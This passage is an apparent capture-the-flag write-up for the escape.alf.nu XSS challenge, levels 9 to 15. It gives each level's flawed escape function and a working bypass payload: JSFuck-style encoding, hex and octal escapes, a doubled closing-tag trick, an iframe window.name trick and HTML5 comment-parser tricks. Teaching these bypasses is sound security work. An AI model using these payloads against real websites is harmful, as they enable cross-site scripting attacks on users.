class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]	[<span class="link_label">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label">+!![</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]])())[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])))())//</div></pre></td></tr></table></figure>

<p>We can also try to use our own minimization using the letters in “false”, “true”, “undefined” and “object”:</p>
<ul>
<li>false =&gt; ![]</li>
<li>true =&gt; !![]</li>
<li>undefined =&gt; [][[]]</li>
<li>NaN =&gt; +[![]]</li>
<li>0 =&gt; +[]</li>
<li>1 =&gt; +!+[]</li>
<li>2 =&gt; !+[]+!+[]</li>
<li>10 =&gt; [+!+[]]+[+[]]</li>
<li>Array =&gt; []</li>
<li>Number =&gt; +[]</li>
<li>String =&gt; []+[]</li>
<li>Boolean =&gt; ![]</li>
<li>Function =&gt; [][“filter”]</li>
<li>eval =&gt; [][“filter”]<a href="CODE">“constructor”</a>()7</li>
<li>window =&gt; [][“filter”]<a href="&quot;return this&quot;">“constructor”</a>()<br>来源： <a href="http://www.jsfuck.com/" target="_blank" rel="external">http://www.jsfuck.com/</a></li>
</ul>
<p>Strings we will need:</p>
<ul>
<li>sort<br>  [(”+!1)[3]+(”+{})[1]+(”+!0)[1]+(”+!0)[0]]</li>
<li>constructor<br>  [(”+{})[5]+(”+{})[1]+(”+{}[0])[1]+(”+!1)[3]+(”+!0)[0]+(”+!0)[1]+(”+!0)[2]+(”+{})[5]+(”+!0)[0]+(”+{})[1]+(”+!0)[1]]</li>
<li>alert(1)<br>  (”+!1)[1] + (”+!1)[2] + (”+!1)[4] +(”+!0)[1]+(”+!0)[0]+”(1)”</li>
</ul>
<p>We will replace the call to alert(1) in our payload:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+<span class="function">alert</span>(1))<span class="comment">//</span></div></pre></td></tr></table></figure>

<p>with the following one so we can simplify the encoding to encode strings.</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+[<span class="link_label"></span>][<span class="link_reference">"sort"</span>][<span class="link_label">"constructor"</span>](<span class="link_url">"alert(1</span>)")()//</div></pre></td></tr></table></figure>

<p>Note: Many other alternatives are possible like:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+(0)[<span class="link_label">'constructor'</span>][<span class="link_reference">'constructor'</span>]("alert(1)")()//</div></pre></td></tr></table></figure>

<p>But I found the “sort” one to be the shortest (with other 4 letter functions like “trim”)</p>
<p>This is a 246 characters solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">"+[<span class="link_label"></span>][<span class="link_reference">(''+!1)[3</span>]+(''+{})[<span class="link_label">1</span>]+(''+!0)[<span class="link_label">1</span>]+(''+!0)[<span class="link_label">0</span>]][(''+{})[5]+(''+{})[1]+(''+</div><div class="line">{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+</div><div class="line">(''+{})[<span class="link_label">1</span>]+(''+!0)[<span class="link_label">1</span>]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+</div><div class="line">(''+!0)[0]+"(1)")())//</div></pre></td></tr></table></figure>

<p>We can improve it by defining a variable containing all our letters and then just referencing it:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">_=''+!1+!0+{}[0]+{} = "falsetrueundefined[object Object]"</div><div class="line"></div><div class="line">");<span class="emphasis">_=''+!1+!0+{}[0]+{};[][_</span>[<span class="link_label">3</span>]+<span class="emphasis">_[19]+_</span>[<span class="link_label">6</span>]+<span class="emphasis">_[5]][_</span>[23]+<span class="emphasis">_[19]+_</span>[10]+_[3]+</div><div class="line"><span class="emphasis">_[5]+_</span>[<span class="link_label">6</span>]+<span class="emphasis">_[7]+_</span>[<span class="link_label">23</span>]+<span class="emphasis">_[5]+_</span>[<span class="link_label">19</span>]+<span class="emphasis">_[6]](_</span>[1]+<span class="emphasis">_[2]+_</span>[4]+<span class="emphasis">_[6]+_</span>[5]+'(1)')()//</div></pre></td></tr></table></figure>

<p>Now the solution is 144 characters which is still far from the winners:</p>
<p>Next iteratation is to change the base payload for something sorter like window.alert(1) In chrome, we can leak a reference to window with:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(0,<span class="attr_selector">[]</span><span class="attr_selector">["concat"]</span>)()<span class="attr_selector">[0]</span></div></pre></td></tr></table></figure>

<p>So using the same strings as above we get the following 100 characters solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">");<span class="emphasis">_=""+!1+!0+{}[0]+{};(0,[][_</span>[23]+<span class="emphasis">_[19]+_</span>[10]+<span class="emphasis">_[23]+_</span>[1]+_[5]])</div><div class="line">()[<span class="link_label">0</span>][<span class="link_reference">_[1</span>]+<span class="emphasis">_[2]+_</span>[<span class="link_label">4</span>]+<span class="emphasis">_[6]+_</span>[<span class="link_label">5</span>]](1)//</div></pre></td></tr></table></figure>

<p>We are still taking too many chars for defining our alphabet. Here is where Mario surprised me once again with this tweet:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">");(<span class="emphasis">_=!1+URL+!0,[][_</span>[<span class="link_label">8</span>]+<span class="emphasis">_[11]+_</span>[<span class="link_label">7</span>]+<span class="emphasis">_[8]+_</span>[<span class="link_label">1</span>]+<span class="emphasis">_[9]])()[0][_</span>[1]+_[2]</div><div class="line">+<span class="emphasis">_[4]+_</span>[<span class="link_label">38</span>]+_[<span class="link_label">9</span>]](1)//</div></pre></td></tr></table></figure>

<p>Note that he is using !1+URL+!0 as the alphabet string and it difers for different browsers:</p>
<p>Firefox:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">_=!<span class="number">1</span>+URL+!<span class="number">0</span>=<span class="string">"falsefunction URL() {</span></div><div class="line"> [native code]</div><div class="line"> }true<span class="string">"</span></div></pre></td></tr></table></figure>

<p>Chrome:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_=<span class="exclamation_mark">!</span><span class="number">1</span>+<span class="variable">URL</span>+<span class="exclamation_mark">!</span><span class="number">0</span>=<span class="string">"falsefunction URL() { [native code] }true"</span></div></pre></td></tr></table></figure>

<p>Other interesting Mario ’s finding is that inside with-statements, almost everything leaks [object Window] for example:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">with</span><span class="params">(<span class="number">0</span>)</span> <span class="title">x</span>=[].<span class="title">sort</span>,<span class="title">x</span><span class="params">()</span></span></div></pre></td></tr></table></figure>

<h3 id="Level_10:">Level 10:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {</span></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">htmlEscape</span><span class="params">(s)</span> {</span></div><div class="line">		<span class="keyword">return</span> <span class="transposed_variable">s.</span>replace(/./g, <span class="function"><span class="keyword">function</span><span class="params">(x)</span> {</span></div><div class="line">		<span class="keyword">return</span> { <span class="string">'&lt;'</span>: <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>: <span class="string">'&gt;'</span>, <span class="string">'&'</span>: <span class="string">'&'</span>, <span class="string">'"</span><span class="string">': '</span><span class="string">"'</span>, <span class="string">"'</span><span class="string">": '''</span> }<span class="matrix">[x]</span> || x;</div><div class="line">	 });</div><div class="line">}</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">expandTemplate</span><span class="params">(template, args)</span> {</span></div><div class="line">	<span class="keyword">return</span> <span class="transposed_variable">template.</span>replace( /{(\w+)}/g,</div><div class="line">	<span class="function"><span class="keyword">function</span><span class="params">(_, n)</span> {</span></div><div class="line">		<span class="keyword">return</span> htmlEscape(args<span class="matrix">[n]</span>);</div><div class="line">	});</div><div class="line">}</div><div class="line">	<span class="keyword">return</span> expandTemplate(</div><div class="line">		<span class="string">" \n\</span></div><div class="line">   			&lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt; \n\</div><div class="line">		 &lt;script&gt; \n\</div><div class="line">			var v = document.getElementById('<span class="transposed_variable">name'</span>); \n\</div><div class="line">			<span class="transposed_variable">v.</span>innerHTML = <span class="string">'&lt;a href=#&gt;{name}&lt;/a&gt;'</span>; \n\</div><div class="line">		&lt;\/script&gt; \n\</div><div class="line">  			 <span class="string">",</span></div><div class="line">  			 { name : s }</div><div class="line">   		);</div><div class="line">  	 }</div></pre></td></tr></table></figure>

<p>Injection takes place in a JS string context and since “\” is not escaped in the htmlEscape function, we can use hex or octal encoding for the “&lt;” symbol and bypass the escaping function.</p>
<p>Valid solutions:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">\x3csvg <span class="variable">onload=</span>alert(<span class="number">1</span>)</div><div class="line"></div><div class="line">   	\<span class="number">74</span>svg <span class="variable">onload=</span>alert(<span class="number">1</span>)</div></pre></td></tr></table></figure>

<h3 id="Level_11:">Level 11:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</span></span></div><div class="line">   		<span class="comment">// Spoiler for level 2</span></div><div class="line">   		s = <span class="built_in">JSON</span>.stringify(s).replace(<span class="regexp">/&lt;\/script/gi</span>, <span class="string">''</span>);</div><div class="line">   		<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>';</div><div class="line">   	}</div></pre></td></tr></table></figure>

<p>I’ve seen similar escaping functions in real applications, normally it is not a good idea to fix the input data, you either accept it or reject it but trying to fix it normally leads to bypasses. In this case the escape function replaces “&lt;/script” with an empty string so shortest solution is:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="tag">&lt;/&lt;/<span class="attribute">scriptscript</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span></span></div></pre></td></tr></table></figure>

<h3 id="Level_12:">Level 12:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</span></span></div><div class="line">	<span class="comment">// Pass inn "callback#userdata"</span></div><div class="line">	<span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>);</div><div class="line">	<span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</div><div class="line">	<span class="keyword">var</span> obj = {<span class="string">'userdata'</span>: thing[<span class="number">1</span>] };</div><div class="line">	<span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>);</div><div class="line">	<span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>";</div><div class="line">}</div></pre></td></tr></table></figure>

<p>Similar to level 7 but this time the backslash is also escaped so we use a similar vector with a different way to comment the junk out:</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'#'</span>;alert(<span class="number">1</span>)&lt;!<span class="comment">--</span></div></pre></td></tr></table></figure>

<p>It will render:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="string">'({"userdata":"'</span>;alert(<span class="number">1</span>)&lt;!--<span class="string">"})</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<h3 id="Level_13:">Level 13:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">  	<span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</div><div class="line">  		<span class="keyword">var</span> tag = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</div><div class="line">  		<span class="comment">//For this one, you get to run any code you want,but in a "sandboxed" iframe.</span></div><div class="line"> 		 <span class="comment">//</span></div><div class="line">  		<span class="comment">// http://print.alf.nu/?text=... just outputs whatever you pass in.</span></div><div class="line">  		<span class="comment">//</span></div><div class="line"><span class="comment">// Alerting from print.alf.nu won't count; try to trigger the one below.</span></div><div class="line">s = <span class="string">'&lt;script&gt;'</span> + s + <span class="string">'&lt;\/script&gt;'</span>;</div><div class="line">tag.src = <span class="string">'http://print.alf.nu/?html='</span> + <span class="built_in">encodeURIComponent</span>(s);</div><div class="line"><span class="built_in">window</span>.WINNING = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{ youWon = <span class="literal">true</span>; };</div><div class="line">tag.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{</div><div class="line">  			f (youWon) alert(<span class="number">1</span>);</div><div class="line">  			};</div><div class="line">  			<span class="built_in">document</span>.body.appendChild(tag);</div><div class="line">  		}</div></pre></td></tr></table></figure>

<p>Iframes have a interesting feature: setting the name attribute on an iframe sets the name property of the iframe’s global window object to the value of that string. Now, the interesting part is that it can be done the other way around, so an iframe can define its own window.name and the new name will be injected in the parent’s global window object if it does not exist already (it cannot overwrite it). So if we fool the framed site to declare its window.name as “youWon”, a youWon variable will be setted in the parent global window object and so the “alert(1)” will be popped</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=<span class="string">'youWon'</span></div></pre></td></tr></table></figure>

<h3 id="Level_14:">Level 14:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">   	<span class="doctype">&lt;!DOCTYPE HTML&gt;</span></div><div class="line">function escape(s) {</div><div class="line">	function json(s) { </div><div class="line">		return JSON.stringify(s).replace(/\//g, '\\/'); </div><div class="line">	}</div><div class="line"></div><div class="line">	function html(s) { </div><div class="line">		return s.replace(/[<span class="tag">&lt;&gt;</span>"&]/g, function(s) {</div><div class="line">			return '&#' + s.charCodeAt(0) + ';'; </div><div class="line">		}); </div><div class="line">	}</div><div class="line">	return (</div><div class="line">		'<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="string">' +</span></span></div><div class="line">			'<span class="keyword">var</span> url = <span class="string">' + json(s) + '</span>; </div><div class="line">			<span class="comment">// We\'ll use this later ' + '</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>\n\n' +</div><div class="line">			' <span class="comment">&lt;!-- for debugging --&gt;</span>\n' +</div><div class="line">			' URL: ' + html(s) + '\n\n' +</div><div class="line">			'<span class="comment">&lt;!-- then suddenly --&gt;</span>\n' +</div><div class="line">			'<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">\n<span class="string">' +</span></span></div><div class="line">			' <span class="keyword">if</span> (!<span class="regexp">/^http:.*/</span>.test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);\n<span class="string">' +</span></div><div class="line">			' <span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;\n<span class="string">' +</span></div><div class="line">		'<span class="tag">&lt;/<span class="title">script</span>&gt;</span>'</div><div class="line">		);</div><div class="line">   	}</div></pre></td></tr></table></figure>

<p>In order to solve this level we need to be familiar with an HTML5 parser “feature” when dealing with comments in JS blocks. This feature is well described in this post (thanks for the hint @cgvwzq !).</p>
<p>The trick is that injecting an HTML5 single line comment “!—” followed by a “”script”” open tag will move the parser into the “script data double escaped state” until the closing script tag is found and then it will transition into “ script data escaped state ” and it will treat anything from the end of the string where we injected the “”!—“scrip”” as JS! only thing we need to do is making sure there is a “—&gt;” so that the parser does not throw an invalid syntax exception.</p>
<p>So basically, if there is a “—&gt;” somewhere in the code (or we can inject it) we can fool the parser into processing HTML as JS. The string where we inject “”!—“script”” will still be considered as a JS string an everything following the string will become JS.</p>
<p>For this level we will make the JS engine to parse the HTML part (URL: xxx). In order to do so, we will start our payload with “alert(1)” so that the first JS evaluated will be “URL: alert(1)” then we want to comment out the remaining JS code so we will insert a multi-line comment start “/ ”. This way everything else will be commented out until we reach the “ /” present in the regexp; the code from that point on will be evaluated. In order to get a valid regexp we will also inject “if(/a/” before the multi-line comment start. So our payload will look like:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alert(1);/<span class="keyword">*</span><span class="variable">&lt;!--&lt;script&gt;</span><span class="keyword">*</span>/if(/a//<span class="keyword">*</span></div></pre></td></tr></table></figure>

<p>The resulting code will be:</p>
<p><img src="http://evilddog.qiniudn.com/escape.alf.nu_3.png" alt=""></p>
<p>Now if we clean it up and remove the comments (in grey):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">	<span class="keyword">var</span> url = <span class="string">"alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*"</span>;</div><div class="line">	URL: alert(<span class="number">1</span>); <span class="keyword">if</span>(<span class="regexp">/a/</span>.test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);</div><div class="line"> <span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>We can get it even shorter with:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(alert(<span class="number">1</span>)/*&lt;!<span class="comment">--&lt;script&gt;</span></div></pre></td></tr></table></figure>

<p>This will turn into:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">	<span class="keyword">var</span> url = <span class="string">"alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*"</span>;</div><div class="line">	URL: <span class="keyword">if</span>(alert(<span class="number">1</span>).test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);</div><div class="line">	<span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<h3 id="Level_15:">Level 15:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</div><div class="line">	<span class="keyword">return</span> s.split(<span class="string">'#'</span>).map(<span class="function"><span class="keyword">function</span><span class="params">(v)</span> </span>{</div><div class="line">		<span class="comment">// Only 20% of slashes are end tags; save 1.2% of total</span></div><div class="line">		<span class="comment">// bytes by only escaping those.</span></div><div class="line">		<span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(v).replace(<span class="regexp">/&lt;\//g</span>, <span class="string">'&lt;\\/'</span>);</div><div class="line">		<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span>+json+<span class="string">')&lt;/script&gt;'</span>;</div><div class="line">	}).join(<span class="string">''</span>);</div><div class="line">}</div></pre></td></tr></table></figure>

<p>We can use the same trick we used for level 14. We can start with something simple like:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload1<span class="comment">#payload2</span></div></pre></td></tr></table></figure>

<p>that will render:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">   	<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"payload1"</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"payload2"</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>We can take advantage of HTML5 “”!—“script”” trick to change the way the parser treats the code between the two blocks and inject our “alert(1)” payload. Note that this trick only works in HTML5 documents and we will need to inject a closing “—&gt;” since it is not present in the code</p>
<p>The solution is:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</span></div></pre></td></tr></table></figure>

<p>This will render:</p>
<p>Since we transition to “ script data double escaped state ” when the parser finds “&lt;!—“script’”, the JS engine will receive the following valid JS expression:</p>
<p>That can be interpreted as:</p>
